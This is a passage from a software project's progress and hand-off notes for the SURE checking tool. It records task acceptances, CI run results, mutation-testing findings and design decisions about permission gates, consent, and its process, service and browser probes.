   it as **`+18`** `sure_core`, **`+9`** the new `node_checks` binary, **`+1`**
   `check_schedule`, **`+0`** on the other thirty-six names.
   **Two things in the task are worth a reader's time before `P4-T003`.** The
   first is the **vocabulary gap**, which is the whole of the task: the frozen
   `NotCheckedReason` has no word meaning *"the project declares this and what it
   declares is not something SURE can run"*, and the three ways a role ends up
   with no command need different answers. `NotApplicable` is true for a project
   that declares no `test` script and **false** for one that wrote
   `"test": ["jest"]`; `ToolUnavailable` is a claim about the machine;
   `UnsupportedStack` is false for the stack SURE checks best. Two of the three
   therefore map onto `UnknownReason`, and **the choice is load-bearing rather
   than cosmetic**, because `blocks_green` reads `is_scope_limit`: a project that
   declares no test script should not be held out of green, and a project whose
   manifest is broken should be, and the two fixtures that differ by exactly one
   script name are what holds that apart. `progress/DECISIONS.md` carries the
   argument over all ten variants and the four candidates it came down to.
   The second is that **four mutations survived the first run and all four were
   the same finding** — a policy stated in prose and held by no test. Flipping the
   lint's severity, flipping the type check's criticality, dropping the
   explanation from `MissingCommand::plain_description`, and answering `is_empty`
   from `proposed` alone each passed the whole suite. **The test written to kill
   the fourth then survived its own mutation**, because its fixture used a project
   that declares one script and so `proposed.is_empty()` was `false` under both
   readings — **a test for a conjunction is worth exactly as much as the case
   where the two conjuncts differ**, and the fixture is now a project that
   declares nothing. The final tally is twenty-three mutations, twenty-three
   caught, eight by exactly one test.
   **The renumbering, recorded the way the earlier acceptances recorded theirs.**
   Inserting this item moved every item below it by one, and `grep -n "item
   [0-9]"` found **26 lines, of which ten are live and sixteen are dated
   narrative**. The ten live ones were bumped and each was then re-read against
   the printed list **after** the renumbering rather than before it: the snapshot
   item `17 → 18` (two lines in the state section and two in this list), the
   `.cmd`/`.bat` owner decision `23 → 24` (five lines), and the `ComponentGraph`
   reference `20 → 21`, which was checked by printing item 21's first line and
   seeing `P2-T007`, the task that owns `components.rs`. **The sixteen dated lines
   were deliberately not touched**, including the ones that narrate *earlier*
   renumberings — `item 15 → 16`, `item 18 → 19`, `item 13 → 14`, `item 16 → 17`
   — because each of those is a claim about what a specific acceptance found and
   printed, and rewriting them would destroy the only record of the failure mode
   they exist to warn about. **A dated number and a live number look identical in
   a grep**, which is why the check is followed by printing the item the last of
   them names.
4. **`P4-T001` is implemented, pushed, read, and accepted by the commit carrying
   this file, and it is one commit — which opens phase `P4`.** `97f0707` adds
   `crates/sure-core/src/schedule.rs` (**886 lines of module above its
   `#[cfg(test)]` and 1215 below it**, 20 `#[test]` functions),
   `crates/sure-core/tests/check_schedule.rs` (766 lines, nine `#[test]`
   functions) and one line of `lib.rs`. **No file outside `sure-core` changes and
   no proposer is implemented**: that is `P4-T002`, `P4-T003` and `P4-T004`, whose
   `depends_on` each name `P4-T001`, so the rule in `tests/check_schedule.rs` that
   says *nothing in the product proposes a check yet* is **meant to fail in the
   first of them**, and that commit is where somebody reads `PROPOSER_WORDS` and
   the paragraph above it. **Accepting this task unblocked four** — `P4-T002`,
   `P4-T003`, `P4-T004` and `P5-T001` — so the READY list went `12 → 15`. Run
   `34963032089`, all five jobs `success`, Windows **1306** / macOS **1307** /
   Ubuntu **1308** passed, 0 failed, 11 ignored, **49** result lines = **39
   parents + 10 children**; **+29 on every platform** against `34959719084`, the
   parent count going 38 → 39 for the new `check_schedule` binary and the children
   standing still at 10. Namesets **`+29 −0`** against the same run **on all three
   platforms**, with the added set identical on all three: twenty
   `schedule::tests::*` and nine integration tests. **The `−0` is the half a count
   cannot show** — a rename or a deletion that kept the total would be invisible
   in `+29`.
   **Two things in the task are worth a reader's time before `P4-T002`.**
   The first is that **a sentence a user would have read was wrong, and the test
   that found it was written for another reason**: `blocked_by` filtered on the
   *decision*, so it named permissions the user had **already granted** and
   `plain_description` said *"will not run: run_project_code"* about one of them.
   The fix is that `blocked_by` and `permissions_missing` now take **no mode** —
   they are facts about the permission set — and `plain_description` has **three**
   outcomes, so a check the *mode* stopped says *"will run only if you agree"*
   instead of naming a permission that is not the obstacle. The second is that
   **one mutation survived the first run of the set and the test that kills it
   exists only because of that**: `may_run` answered from `blocked_by.is_none()`
   passes **all 630 tests**, because the two agree whenever a check is denied a
   permission and come apart exactly where every permission is granted and the
   mode still refuses — where a caller would be told the check runs and would
   produce **no result for it at all**, so the check would vanish from the report
   rather than appear as one that did not happen.
5. **`P3-T011` is implemented, pushed, read, and accepted, and it is one commit —
   which closed phase `P3`.** `be02100` adds
   `crates/sure-core/src/browser.rs` (**843 lines of module and 418 of its own
   tests**, nineteen `#[test]` functions), `crates/sure-core/tests/browser_probe.rs`
   (427 lines, seven `#[test]` functions) and one line of `lib.rs`. **No file
   outside `sure-core` changes and no driver is implemented**: that is `P5-T004`,
   whose `depends_on` is `["P3-T011","P5-T002"]`, so the rule in
   `tests/browser_probe.rs` that says *nothing in the product can drive a browser
   yet* is **meant to fail there**, and that commit is where somebody reads the
   paragraph above the rule. Run `34959719084`, all five jobs `success`, Windows
   **1277** / macOS **1278** / Ubuntu **1279** passed, 0 failed, 11 ignored,
   **48** result lines = **38 parents + 10 children**; **+26 on every platform**
   against `34958280318`, the parent count going 37 → 38 for the new
   `browser_probe` binary and the children standing still at 10. Namesets
   **`+26 −0`** against the same run **on all three platforms**, with the added
   set identical on all three: nineteen `browser::tests::*` and seven integration
   tests. **The `−0` is the half a count cannot show** — a rename or a deletion
   that kept the total would be invisible in `+26`.
   **Three things in the task are worth a reader's time before `P5-T004`.**
   The first is that **the false green was found in the interface and not in the
   mapping**: a page served a 404 renders, has a title, reports no console errors
   and loads completely, so every field of the first draft's `Observation` added
   up to a pass about a page that was never served — and it could not be fixed by
   changing the mapping, because **a driver had no way to *say* the status**.
   `document_status: Option<u16>` is now part of the interface and `None` is
   `Unknown`, which is `ProbeOutcome::NoAnswer`'s technique one module over:
   staying silent is not an answer. The second is that **`UnsupportedPlatform`
   was written as `UnsupportedStack` for one run and that was a hole** —
   `UnsupportedStack` *is* a scope limit, so a critical browser check on an
   operating system SURE cannot drive a browser on would have **stopped blocking
   green**, and a reassuring status for the case where SURE knows least is the
   worst place to have one. The test caught it; the mapping was what was wrong.
   The third is that **the isolation is a source rule because an absence cannot be
   run**: `m5` adds a second `CheckStatus`-returning function to the module and
   **all 611 tests in the `sure-core` lib pass**, because a function nothing calls
   is not a behaviour any test can observe — only the rule that counts `->
   CheckStatus` in the shipped part of the file sees it. **What it does not
   establish: whether any driver is honest.** The interface keeps a driver from
   *spelling* a verdict, not from being *wrong*, and a driver that reports
   `complete: true` and no problems about a page that threw has lied in a way
   nothing in this file can detect. That paragraph is in the module header, next
   to the mechanism, because a claim the code contradicts is worse than a missing
   one. **This task also repaired two gaps in this file**, both recorded where
   they are: the run-index row for `34958280318`, `P3-T010`'s acceptance, which
   was read in the session that produced it and never written into the table, and
   item 20 below, which `P3-T011` found three acceptances stale and which
   `P4-T001` then found four — **the number in that sentence had to be rewritten
   one acceptance later, which is the argument for the parenthesis at item 20's
   own reading rule and against a bare number anywhere else in this list.**
6. **`P3-T010` is implemented, pushed, read, and accepted by the commit carrying
   this file, and it took four commits and three runs — one of them red.**
   `43c4a61` is the probe, `9ad32e6` is the two module unit tests and the mutation
   evidence, `0eb1ac3` corrects a claim that the module has no boolean asking
   whether the port is open — **it has had one since `43c4a61`, and the false
   sentence was in the module's rustdoc header, so it was on course to ship as
   crate documentation** — and `01fc2a7` fixes a **TCP self-connect** that the
   second commit's own run found on Windows. Run `34955834313` carries the first
   two commits (`43c4a61` has no run of its own; they were pushed together): five
   jobs `success`, Windows **1250** / macOS **1251** / Ubuntu **1252** parent
   tests, 0 failed, 11 ignored, 47 result lines = 37 parents + 10 children,
   namesets **`+23 −0`** against `34954317400` with the identical added set on all
   three platforms. **`34956776646` is red on `rust (windows-latest)` and it is
   the run of the doc-comment-only commit** — macOS and Ubuntu report the previous
   run's 1251 and 1252 to the test, Windows reports **1249 passed and 1 failed**,
   and **the reported first line is the probe's own request line**, which is a
   fact no flake can produce. **`34957515713` is the green on the fix**: Windows
   **1251** / macOS **1252** / Ubuntu **1253**, 0 failed, 11 ignored, **+1 on
   every platform** and the failing test out of the failed column. **Eleven
   mutations, ten caught, and `m8` is the finding**: deleting the `WouldBlock` arm
   of `is_a_timeout` passed all twenty integration tests, because **Windows reports
   an expired socket read timeout as `TimedOut` and a Unix reports the same
   condition as `WouldBlock`** — so **the arm was held by nothing on the platform
   it was written on**, and it is now held by a unit test that is the only thing in
   `sure-core` that catches it. **The harness's own filter was the second half of
   that finding**: `--test probe_local_service` does not run the lib, so the first
   re-run after adding the unit test still reported a survivor, and a mutation
   reported as surviving under a filter that could not have run its test measures
   the filter rather than the mutation. **`m11` is the other survivor and it has no
   such excuse**: it deletes the self-connect branch `01fc2a7` added and **all 591
   tests in `sure-core` pass without it**, because a self-connect needs the kernel
   to choose a particular port and it does not choose on request — **0 in 40
   attempts** of dialling just-released ports, at about **2.04 seconds** per
   refusal. The predicate is tested; the branch that calls it is not, and that is
   the one line in this task whose coverage is a measurement rather than a claim.
   **What it does not establish: whether the feature works.** A pass names the request it made — `local probe: GET /health
   HTTP/1.1 answered` — and a test asserts the title says neither "works" nor
   "ready"; no body, no header and no `Content-Length` is parsed, and the end of a
   response is the end of the connection and nothing else. **It also repaired this
   file's header and the list below**, which is recorded there rather than here.
7. **`P3-T009` is implemented, pushed, read, and accepted by the commit carrying
   this file — and it took two commits because the first run was red.** `6911e2a`
   is the supervisor and `12b81bc` is a one-assertion fix; the runs are
   `34952200942` and `34952509429`, read in full and attributed in "Reading runs
   `34952200942` and `34952509429`", where the first is **windows success, ubuntu
   success, macOS failure** and the second is all five jobs `success`. **Windows
   1217 / macOS 1218 / Ubuntu 1219** parent tests, 0 failed, 11 ignored, over **46
   result lines = 36 parents + 10 children** on every job; `name-delta.py` between
   the red run and the green one is **`+0 −0` on all three platforms**. It adds
   `crates/sure-core/src/service.rs` (411 lines), `crates/sure-core/tests/
   service_supervisor.rs` (824, of which 6 are claims and 2 are children), the
   `AdmittedCommand` witness in `enforce.rs`, `run_when_started` in
   `process/mod.rs`, a rewritten ceiling paragraph in `support.rs`, and a third
   rule in `tests/spawn_sites.rs`. **Seven mutations, seven caught, each by exactly
   one test** — and three of the seven by one test, which is recorded because it is
   the shape a future deletion would exploit. **Three things in it matter to
   whoever starts `P3-T010` or `P3-T011`.** The first is that **the door is now a
   type**: `Supervisor::start` takes an `AdmittedCommand<'_>` and nothing else, its
   constructor is private, and `Enforcement::admitted()` is still the only
   producer — so a probe that launches anything has one route and it is the one
   `P3-T007` built. The second is that **there is no `is_ready`, deliberately**:
   `start` returning `Ok` means the operating system accepted the spawn and SURE is
   reading the process, and nothing more, because *a process exists* is not *it is
   listening* and **`P3-T010` is where that question is decided rather than
   inherited**. The third is that **a `Service` stops itself when dropped and takes
   the outcome with it** — so a probe that cleans up by dropping one gets no logs,
   and `Service::stop(self)` is the only way to be told what a service printed. The
   `.cmd`/`.bat` question **cannot arise in this task and the reason is structural
   rather than lucky**: a batch file is never admitted, so no `Supervisor` can be
   handed one, and item 26 below carries the correction to the two predictions that
   said otherwise.
8. **`P3-T008` is implemented, pushed, read, and accepted by the commit carrying
   this file, and it added no spawn site either — for a reason it states rather
   than one that happened.** `6ea9f46` is the implementation, run `34946515895`,
   all five jobs `success`, **Windows 1209 / macOS 1210 / Ubuntu 1211** parent
   tests with 0 failed and 9 ignored over **45 result lines = 35 parents + 10
   children** on each — read in full and attributed in "Reading run
   `34946515895`", where Windows CI matches this machine's own `cargo test` value
   for value and each platform's nameset moved **+21 −0** against `0f9273b`, the
   twenty-one additions named rather than counted. It adds
   `crates/sure-core/src/container.rs` (16 tests) and
   `crates/sure-core/tests/container_isolation_claim.rs` (5), makes
   `doctor::find_in` `pub(crate)`, corrects `ExecutionMode`'s doc comment and
   consent prompt, and corrects `docs/adr/0009` and
   `docs/architecture/EXECUTION_SAFETY.md`. **Three things in it matter to whoever
   starts `P3-T009`, `P3-T011` or `P14-T006`.** The first is that **a missing
   container runtime is a value and not an error**: `Availability` is
   `Found { runtime, program }` or `Absent`, with no third arm and no `Result`, so
   a caller that wants a `Runtime` has to handle the absence to get one. `Absent`
   is the ordinary case on a machine like this one, and the honest path is the one
   that says what **does** happen rather than only what is missing — **which is
   the same sentence `P3-T011`'s acceptance asks for in another domain**
   (*"Browser unavailable => skipped/unknown"*) and the same one `P14-T006`'s
   second sentence asks for in this one (*"Container unavailable path is
   honest"*). Two later tasks with the same shape and one module that already has
   the shape written down. The second is that **the mount cannot be derived and
   the network can**: `Network` is one of the five `CommandClass` categories so
   `for_command` derives it, and there is no "writes inside the project" category
   so `Access` is an argument whose default is read-only. That missing category is
   the owner decision this file has carried since `P3-T004`, and `P3-T008` is
   **the first task blocked by it rather than merely mentioning it** — the blocked
   work is named (deriving `Access`) rather than left to be rediscovered. The
   third is that **`isolation_claim()` is this build's sentence about containers
   and not a measurement of one**: no process is started, nothing verifies that
   Docker accepts these arguments, and no `--memory`, `--cpus` or `--pids-limit`
   appears in the plan, so *limited isolation* is a claim about reach and not
   about load. `P3-T008` also **found and did not fix** a coverage gap in
   `doctor::find_in` — the rule that an empty `PATH` entry is skipped is held by
   no test, and removing it leaves the whole workspace green, measured — recorded
   in `DECISIONS.md` and in "What `P3-T008` added" above, and **this is the first
   recorded mutation on this branch that survived rather than being closed.**
9. **`P3-T007` is implemented, pushed, read, and accepted by the commit carrying
   this file, and it added no spawn site either.** Three commits rather than one,
   because the second and third were each found after the one before it had been
   pushed and read: `6353477` is the module, `18209d8` is the batch-file test,
   `719253e` is the test a mutation showed was missing. Runs `34943445326`,
   `34943853809` and `34944133634`, all five jobs `success` on each, **Windows
   1186 / 1187 / 1188, macOS 1187 / 1188 / 1189, Ubuntu 1188 / 1189 / 1190**
   parent tests with 0 failed and 9 ignored over **44 result lines = 34 parents +
   10 children** on every run — read in full and attributed in "Reading run
   `34943445326`", "Reading run `34943853809`" and "Reading run `34944133634`",
   where each platform's nameset moves **+14 −0**, **+1 −0** and **+1 −0** against
   the run before it, the additions named and read out of the logs rather than
   counted. It adds `crates/sure-core/src/enforce.rs` (857 lines, 16 tests — the
   sixteen the three deltas name), makes `consent::runs_project_code`
   `pub(crate)`, and adds a section to
   `docs/architecture/EXECUTION_SAFETY.md`. **Three things in it matter to
   whoever starts `P3-T009` or `P3-T008`.** The first is the whole of it: **a
   runner must take what it launches from `Enforcement::admitted()` and from
   nowhere else.** `PermissionPlan::commands()` is every command the plan
   considered, `admitted()` is the subset that may run, and the difference
   between those two iterators is the entire enforcement — which is a rule about
   the caller that no type in this repository holds. The second is that
   **`P3-T009` does not depend on `P3-T007`**: the service startup supervisor is
   the next task in the DAG whose acceptance is about starting something, its
   `depends_on` is `["P3-T001","P3-T006"]`, both accepted, so it is READY beside
   this task rather than behind it — **nothing in `tasks/tasks.json` makes it
   consult the enforcement**, and a supervisor that starts a service directly
   would satisfy its own acceptance sentence while this gate is bypassed. The
   third is that **`NeedsConsent` is now a stop and not a question**: the module
   has no prompt, so a command the mode was too cautious for is stopped under
   `ExecutionNotAuthorized` — deliberately not `UserDeclined`, because nobody
   declined — and that includes `git push --force` in `host_confirmed` with every
   permission granted, because `Destructive` has no permission to grant. So
   `P3-T006`'s *"`authorise` still has no caller"* is still true and this task did
   not obtain a consent; it turned the decision into a refusal without asking
   anyone.
10. **`P3-T006` is implemented, pushed, read, and accepted by the commit carrying
   this file, and it added no spawn site either.** `d58532a` is the
   implementation, run `34941955270`, all five jobs `success`, **Windows 1172 /
   macOS 1173 / Ubuntu 1174** parent tests with 0 failed and 9 ignored over **44
   result lines = 34 parents + 10 children** on each — read in full and attributed
   in "Reading run `34941955270`", where Windows CI matches this machine's own
   `cargo test` value for value, all 31 names the change adds or renames are
   present on all three jobs, and each platform's nameset moved by **+30 −1** with
   the one removal being the rename. It adds `crates/sure-core/src/approval.rs`
   (1777 lines, 24 tests), `ApprovedCommand::effects` and `CommandEffects::covers`
   in the domain, and `RecordKind::Approval` in the store. **Three things in it
   matter to whoever starts `P3-T007`, `P3-T008` or `P3-T009`.** The first is the
   one to read: **the gate compares a planned command against the categories the
   user was shown, not against a fresh classification** — re-deriving them would
   compare a value with itself, because `safety::classify` is deterministic on
   `(program, arguments)`, and the first acceptance sentence would then be true of
   nothing. `ApprovedCommand::effects` is what makes it a check, and it only means
   something because an approval outlives the build that wrote it. The second is
   that **`authorise` still has no caller**: `HostConsent` has no producer outside
   a test and no command reaches a process, so the gate is built and the door is
   not opened — `P3-T007` is where a consent would first have to be *obtained*
   rather than adjudicated. The third is a trap worth knowing before writing a
   test against any of it: **under `host_confirmed` with every permission granted
   the prompt surface is very narrow** — `cargo add` and `npm test` are `Allowed`
   and never reach a user — so a test that needs a consented command has to use a
   destructive one (`git push --force`), or it will panic on an empty list rather
   than fail.
11. **`P3-T005` is implemented, pushed, read, and accepted by the commit carrying
   this file, and it added no spawn site.**
   `c940300` is the implementation, run `34938974624`, all five jobs `success`,
   **Windows 1142 / macOS 1143 / Ubuntu 1144** parent tests with 0 failed and 9
   ignored over **44 result lines = 34 parents + 10 children** on each — read in
   full and attributed in "Reading run `34938974624`", where Windows CI matches
   this machine's own `cargo test` value for value and all 26 new test names were
   found **by name on all three jobs**. It adds `crates/sure-core/src/consent.rs`
   (1407 lines, 22 tests), `CheckPlan::exclude` and
   `CommandClass::plain_description` in the domain, and one line in `lib.rs`.
   **Three things in it matter to whoever starts `P3-T006` or `P3-T007`.**
   `PlannedCommand::refusal` is the only `CheckResult` the module produces and it
   cannot produce a passing one: a refused check is `Skipped` with its reason
   **and its weight** kept, which is what stops a skipped `MustFix` critical check
   from aggregating into a green report. **`NeedsConsent` is a decision and not a
   prompt** — there is no consent record, no prompt and no host-execution
   authorisation in the file, and `HostConsent` exists in the domain with nothing
   constructing one — so `P3-T007` is where a `NeedsConsent` decision would first
   have to become a question somebody is asked. And `Destructive` answering `None`
   is the answer to `P3-T004`'s recorded question rather than a dodge of it: a
   command SURE cannot bound needs its own approval naming its exact argument
   vector, **no sixth category was invented**, and the "writes inside the project"
   gap is still open.
12. **`P3-T004` is implemented, pushed, read, and accepted, and its acceptance note
   headlines a number that is not the one it means.**
   `967c5e6` is the implementation and `ea0fe6c` the acceptance; run
   `34935781639`, all five jobs `success`, **Windows 1116 / macOS 1117 / Ubuntu
   1118** *parent* tests with 0 failed and 9 ignored over **44 result lines = 34
   parents + 10 children** on each. **The note's `1126` for Windows is the sum
   over all 44 result lines rather than the number of unique tests**; the ten-line
   gap is `store_concurrency.rs` re-running itself ten times with a filter. The
   note cannot be rewritten — no force push, no history rewrite — so the
   correction lives in `progress/DECISIONS.md` and in "Reading run
   `34938974624`", with a re-read of `34935781639` as its anchor; the same
   mistake is in `c940300`'s own message in two smaller places. **This item exists
   because that acceptance did not prepend one**, which is why the list is two
   items short rather than one and why this acceptance renumbers both at once.
13. **`P3-T003` is implemented, fixed, pushed, read, and accepted by the commit
   carrying this file, and it changed no shipped code.** `b0dcc69` is the
   implementation and `ea2f826` is the fix CI asked for; run `34930744061` is the
   fix's run, all five jobs green, **Windows 1078 / macOS 1079 / Ubuntu 1080**
   parent tests with 0 failed and 9 ignored over **43 results = 33 parents + 10
   children** on each. Read and attributed in "Reading run `34930744061`", where
   the three deltas — **+1 / +3 / +3**, one per platform because each job compiles
   different code — are the acceptance as arithmetic, and all five new test names
   were checked **by name on each of the three jobs**. The red run before it
   (`34929385200`, `b0dcc69`) is recorded beside it, because that run is where the
   `--no-fail-fast` change paid for itself: 14 binaries started after the failing
   test and 19 of the 33 parent result lines came after it. **Its run is read in
   the session that took it rather than committed** — the stopping rule at the top
   of this file, so the `P3-T003` chain ends at the acceptance.
14. **`P3-T002` is implemented, pushed, read, and accepted by the commit carrying
   this file, and it changed no shipped code.** `fd878e6` is the implementation,
   run `34927065374`, all five jobs green, **Windows 1077 / macOS 1076 / Ubuntu
   1077** with 0 failed and 9 ignored over 43 results = **33 parents + 10
   children** — read and attributed in "Reading run `34927065374`", where the one
   apparent difference between the three jobs (Ubuntu printing **42** result
   lines) turned out to be two child results spliced into one line by the
   concurrent children `store_concurrency` spawns, not a missing test. Windows CI
   matches this machine's own re-run on the parent multiset, value for value. All
   five new test names were read by name on each job, and the nine ignored
   children are identical **by name** on all three. **Its run is read in the
   session that took it rather than committed** — the stopping rule at the top of
   this file, so the `P3-T002` chain ends at the acceptance.
15. **`P3-T001` is implemented, pushed, read, and accepted, and it opened phase
   `P3`.** `819d499` is the implementation, run `34924525793`, all five jobs
   green, **Windows 1082 / macOS 1081 / Ubuntu 1082** with 0 failed and 7 ignored
   over **43** result lines = **33 parents + 10 children** — read and attributed,
   with the Windows log matching this machine's own run value for value, in
   "Reading run `34924525793`". All 37 new test names were checked by name on each
   job: **37 of 37 on Windows, 34 of 37 on macOS and Ubuntu**, the three absent
   ones being exactly the `#[cfg(windows)]` tests. **The runner runs nothing
   yet**: no product path calls it, and `tests/spawn_sites.rs` fails the day one
   does without being added to it. `P3-T002` has now used it — in tests only — and
   the first task that would run anything in the product is `P3-T004`.
16. **`P2-T011` is implemented, pushed, read, and accepted by the commit carrying
   this file — and it closed phase `P2`.** `73da9a6` is the implementation, run
   `34919714838`, all five jobs green, **1040 / 1042 / 1043** with 0 failed and 1
   ignored over **41** result lines = **31 parents + 10 children** — read,
   attributed by binary name, and with all 14 `intent_model::tests::*` names and
   all 7 `intent_sources` names found by name on all three jobs, in "Reading run
   `34919714838`". **Its run is read in the session that took it rather than
   committed** — the stopping rule at the top of this file, so the `P2-T011` chain
   ends at the acceptance. **Both mutation harnesses were re-run on the corrected
   evidence parser before the acceptance was taken**, which is the one place this
   acceptance did more than the ones before it; the verdicts are unchanged and the
   `P2-T009` re-run is recorded in its own section.
17. **`P2-T010` is accepted and its chain is complete.** `4746c48` is the
   implementation, run `34869888350`, all five jobs green, **907 / 909 / 910**
   with 0 failed and 1 ignored over **37** result lines = **27 parents + 10
   children** — read, and attributed by binary name, in "Reading run
   `34869888350`".
18. **`P2-T009` is implemented, pushed, read, and accepted by the commit carrying
   this file.** `b644462` is the implementation, run `34917710402`, all five jobs
   green, **1019 / 1021 / 1022** with 0 failed and 1 ignored over **40** result
   lines = **30 parents + 10 children** — read, attributed by binary name, and
   with all 36 `documents::tests::*` names and all 20 `document_commands` names
   found by name on all three jobs, in "Reading run `34917710402`". **Its run is
   read in the session that took it rather than committed** — the stopping rule at
   the top of this file, so the `P2-T009` chain ends at the acceptance.
19. **`P2-T008` is accepted and its chain is complete.** `ec8456d` is the
   implementation, run `34877928915`, all five jobs green, **963 / 965 / 966**
   with 0 failed and 1 ignored over **39** result lines = **29 parents + 10
   children** — read, attributed by binary name, and with all 25 + 18 new test
   names found by name on all three jobs, in "Reading run `34877928915`". Its run
   is read in the session that took it, so its chain ends at the acceptance.
20. **This item is a snapshot taken at `P3-T008`'s acceptance and it is now four
   acceptances stale — the live figures are in `## Exact current state` at the top
   of this file and behind `node scripts/taskctl.mjs status`.** It is kept rather
   than rewritten because the paragraph below records *how the list moves*, which
   does not go stale, and because rewriting it would put a number here that the
   next acceptance makes stale in the same way. **At `P3-T008`'s acceptance the
   READY list was 13 long, and the next task was no longer a choice.**
   `P3-T009`, `P4-T001`, `P4-T005`, `P4-T006`, `P4-T007`, `P4-T008`,
   `P6-T001`, `P6-T005`, `P6-T007`, `P8-T001`, `P12-T008`, `P13-T001`,
   `P13-T004` — read off `node scripts/taskctl.mjs status` at this acceptance,
   which prints `{ accepted: 40, queued: 126 }`. **`P3` is open and `P3-T001`
   through `P3-T008` are accepted**, so **one `P3` task is READY**: `P3-T009`,
   the service startup supervisor. `MASTER_PROMPT.md` §14 prefers **the
   lowest-numbered READY phase/task unless another ordering is required by the
   DAG**, and `P3-T009` is both the lowest-numbered and the only `P3` task whose
   dependencies are satisfied — `["P3-T001","P3-T006"]`, both accepted — so the
   preference and the DAG agree for the first time in several acceptances.
   **The list shrank again, 14 → 13, and this is the third time an acceptance has
   made it shorter.** The shrink landed at the `start` rather than at the
   `accept`, which is the `P3-T003` shape, and the reason is new: `P3-T008` has
   exactly **one** dependent, `P14-T006`, and `P14-T006` also names `P7-T004`,
   which is `queued`. So there was a dependent to enter and it did not, which is
   the `P3-T004` reason arriving at the `P3-T003` step. **A reader who counted
   dependents would predict the list to stand still and be right about the number
   and wrong about the step** — the same arithmetic-versus-reading distinction
   `P3-T003` recorded, from the opposite direction. The previous reading of this
   item said **14**, listed `P3-T008` first, and said `P3-T008` was **not** the
   task that meets the `.cmd`/`.bat` question; that was right, and it was right
   because it was read out of `tasks/tasks.json` rather than reasoned about. The
   reading before that one said the opposite and had to be corrected. **Read the
   list off `taskctl status`, not off this paragraph** — this is the item where a
   stale copy is most obviously a lie.
   **The `.cmd`/`.bat` decision is item 26 below**, and it is the one whoever
   starts `P3-T009` walks into. `P3-T007` reached it and did not settle it, which
   is the third time that has happened and the third time it was the intended
   outcome: that task's acceptance is *"project-controlled executable code is not
   launched in inspect-only mode"*, and a mode whose whole job is deciding what is
   **not** launched still has to say whether a batch file counts as a program —
   which is the same question `safety::classify` already answers one way for
   classification. **The half that does not depend on the owner's answer is now
   closed**: an enforcement built from `enforce.rs` does not admit a batch file in
   any mode under any permission set, whatever a caller is allowed to name.
   **`P3-T008` did not reach that question, and this file predicted twice that it
   would** — item 26 carries the correction, because it is the same fact and
   storing it in one item's prose did not make it available to the next.
   `P4-T007` and `P6-T005` remain **unread by any session**, and `P6-T007`
   and `P8-T001` have been on the list since before this file was written.
   **Read the task entry before choosing**; do not choose from this paragraph.
   **`P8-T005` is the task that would consume what `P2-T011` left**, and it is
   **not** on the list: its `depends_on` is `["P2-T011","P8-T003"]`, `P2-T011` is
   accepted, and it stays `queued` on `P8-T003`. So the observed-request channel
   has its rule and its door and still no capture, and the task that supplies one
   is waiting on a task nobody has read.
21. **`P2-T012` left an owner decision open, and it is the first one a reader
   should look at.** Whether a project's support level states what SURE *can do*
   (today's answer: every project is level C) or what SURE *understands* (which
   would make a readable manifest level B). The change is two lines plus the
   tests that pin today's answer; the argument for each reading is in
   `crates/sure-core/src/support.rs`'s module comment and in
   `docs/product/SUPPORTED_STACKS.md`. **Do not settle it in a later task by
   quietly raising `CEILING`** — `the_ceiling_todays_build_claims_is_never_above_inspect_only`
   will fail if you do, which is the point of it. **The one thing that would
   legitimately move it is a check that runs**, and the prerequisite for that is
   now `accepted`: `P3-T001`, "implement centralized bounded process runner",
   landed as `819d499` and depends only on `P1-T006`. It does not itself raise the
   ceiling —
   a runner is not a check — but it is the step that makes running anything
   possible, so the two tasks are worth reading together.
22. **`P2-T012` also left the classification with no consumer.** `classify` is
   called by its tests and by nothing else: `Project::support` is filled by no
   product code path, so a report does not yet carry the level. That is the same
   shape as `ComponentGraph` in item 23, and it is recorded rather than implied —
   the task's acceptance is that a project/report *records* the level, and what
   exists is the rule and the record, not yet a caller.
23. **`P2-T007` is accepted, its two commits are pushed and read.**
   `586d3a3` the implementation in run `34864498113` — Windows **871** / macOS
   **873** / Ubuntu **874**; `435181f` the run record; `0907acf` the acceptance.
   `node scripts/taskctl.mjs status` now reads `{ accepted: 28, queued: 138 }`
   with **nothing `in_progress`**, so the next session may start any `READY` task
   without adopting an orphan.
24. **The store now holds six rows that no user wrote, and that is the first item
   for whoever next touches `--goal` or the mutation harness.** They are listed in
   "The mutation run wrote six rows into the real store" above, with the reason
   they exist and the one-line statement that removes them. **They are left in
   place deliberately**, because removing rows from a history file with no backup
   is not reversible and is the owner's decision, not this session's. Two
   consequences: a mutation that deletes the empty-goal refusal **will do it
   again**, and any local experiment that runs the `cli_contract` binary writes to
   the developer's real store until a caller can choose where SURE keeps its files
   — which is the same gap `docs/architecture/CLI.md` records as missing test
   coverage.
   **Keep the ordering discipline**: push each task's commits, read that run, and
   only then start the next acceptance. The cost of not doing it is written down
   four times in this file now. **`P2-T006` paid for it in a new currency**: the
   per-target counts read out of a CI log by proximity were wrong three times for
   `P2-T005`, so the whole-step count is cross-checked by a **multiset**
   comparison. **`P2-T007`** compared that multiset against the previous run's
   position by position. **`P2-T010` added the third increment, and it is the one
   to carry forward: compare by binary name, and print the number of matches.**
   Two attempts here reported a well-formed table of zeros — the first because
   `Running` in a GitHub log is followed by an ANSI escape rather than a space,
   the second because a name was carried across a line the pattern had missed and
   labelled another binary's count. Both looked exactly like "no binary changed".
   `target/tmp/bincounts.py` exists so the next session does not rediscover it.
   **`P2-T012` added the fourth, and it is a condition on the third: the
   position-by-position multiset diff `P2-T007` introduced is only a comparison
   when the two runs have the same number of parents.** `P2-T012` adds a test
   binary, so the lists differ in length by one, and the diff it printed had
   three rows that were pure alignment artifacts — well-formed, arithmetically
   consistent, and about binaries nothing had touched. The sound comparison when
   a parent is added is **substitution**: apply the by-name deltas to the before
   multiset and ask whether the after multiset comes back exactly.
   `target/tmp/p2t012delta.py` does it and prints both, so the next session can
   see why the positional table is not the one to trust.
25. **`project_fingerprint` now has one caller, and it is not a check.**
   `sure check --goal` fingerprints the project to bind a recorded goal to a
   state; nothing constructs an `Authority`, nothing runs the check pipeline, and
   nothing compares a goal against a project. So `FINGERPRINTING.md`'s coverage
   rule and the dispatch rule are still properties of the modules and their
   tests, verified, and **not yet properties of a `sure check`** — the one
   invocation that reaches the fingerprinter reaches it for a goal, and reports
   the kind and the digest rather than checking anything. The documentation says
   so in as many words; do not let a later summary of this branch imply
   otherwise.
26. **`P3-T001` left a second owner decision open, and it is the one the next
   three `P3` tasks will each run into: may a caller name a batch file?** The
   facts, all measured and held as tests rather than asserted: a name with no
   extension is completed to `.exe` and nothing else, so a bare `npm`, `yarn`,
   `pnpm` or `gradlew` is **not found** on a machine where all four are installed
